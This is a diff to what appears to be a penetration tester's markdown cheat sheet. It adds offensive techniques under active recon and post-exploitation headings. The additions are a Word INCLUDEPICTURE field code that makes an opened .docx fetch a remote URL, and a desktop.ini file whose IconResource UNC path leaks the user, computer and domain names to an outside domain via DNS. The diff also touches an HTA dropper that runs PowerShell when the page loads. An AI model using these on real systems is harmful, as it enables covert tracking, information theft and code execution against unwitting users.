@@ -10,6 +10,28 @@ This post is a "living document," intended for me to keep a quick-and-dirty refe
 ## Discover Scripts
 [https://github.com/leebaird/discover](https://github.com/leebaird/discover)
 
+# Active Recon
+## DDE Office File
+
+Create a new .docx with field code:
+
+```
+http://domain.tld/path/totoken/index.html
+or
+http://subdomain.domain.tld
+```
+1. Insert
+2. Quick Parts
+3. Field
+4. IncludePicture
+5. After pasting above, add \d
+6. Should look like:
+```
+{ INCLUDEPICTURE "http://domain.tld/path/totoken/index.html" \d \* MERGEFORMAT }
+or
+{ INCLUDEPICTURE \d "http://domain.tld/path/totoken/index.html" \* MERGEFORMAT }
+```
+
 # Active Network Enumeration
 ## Nmap
 ### Identifying live targets from a specific network range
@@ -188,18 +210,29 @@ Obfuscate all the things, drop into batch/hta/whatever.
 
 ## HTA file dropper
 ``` html
-<script language="VBScript"> 
+<script language="VBScript">
     Sub a
         Set z = CreateObject("Wscript.Shell")
         command = "%systemroot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -noexit whatever"
         z.Run command
     End Sub
-</script> 
+</script>
 <body onload="a">
 ```
+
 # Post-exploitation
 
 ## Windows
+
+### Internal Enumeration/Calling Card
+
+Create subfolder of desired location. Inside created folder, create desktop.ini:
+```
+[.ShellClassInfo]
+IconResource=\\%USERNAME%.%COMPUTERNAME%.%USERDOMAIN%.INI.subdomain.domain.tld\resource.dll
+```
+
+Note: Attempting to navigate into the new folder will result in hourglass since resource does not exist. Do not put desktop.ini in a high-traffic folder. Placing token will record traversal one level above, as well as into the new folder.
 
 ### System/context Enumeration
 `whoami`
